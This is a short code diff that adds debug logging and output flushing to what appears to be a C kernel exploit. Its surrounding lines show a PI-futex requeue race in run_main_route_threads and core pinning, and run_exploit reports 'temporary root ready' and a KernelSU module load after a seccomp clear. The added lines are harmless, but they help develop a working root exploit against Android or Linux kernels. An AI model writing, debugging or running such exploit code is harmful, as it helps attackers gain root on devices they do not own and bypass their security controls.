@@ -274,6 +274,8 @@ void *consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
   pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
+  /* diagnostic only: make the consumer-start marker survive process death */
+  fflush(stdout);
   int seen = 0;
   while (!atomic_load(&punch_consume_stop)) {
     int seq = atomic_load(&punch_consume_go);
@@ -344,6 +346,10 @@ int run_main_route_threads(void) {
     usleep(1000);
   usleep(50000);
   errno = 0;
+  /* diagnostic only: first PI-futex op on the main thread. the waiter
+   * thread's FUTEX_WAIT_REQUEUE_PI may execute first in wall-clock order. */
+  pr_info("[diag] pi_futex op=FUTEX_CMP_REQUEUE_PI\n");
+  fflush(stdout);
   futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
   while (!atomic_load(&route_done)) usleep(5000);
 
@@ -1451,6 +1457,9 @@ int run_exploit(int argc, char **argv) {
     pr_warning("temporary root ready; KernelSU module load pending\n");
   else
     pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
+  /* diagnostic only: explicit native-exit marker */
+  pr_info("[diag] native exit\n");
+  fflush(stdout);
   return 0;
 }
 
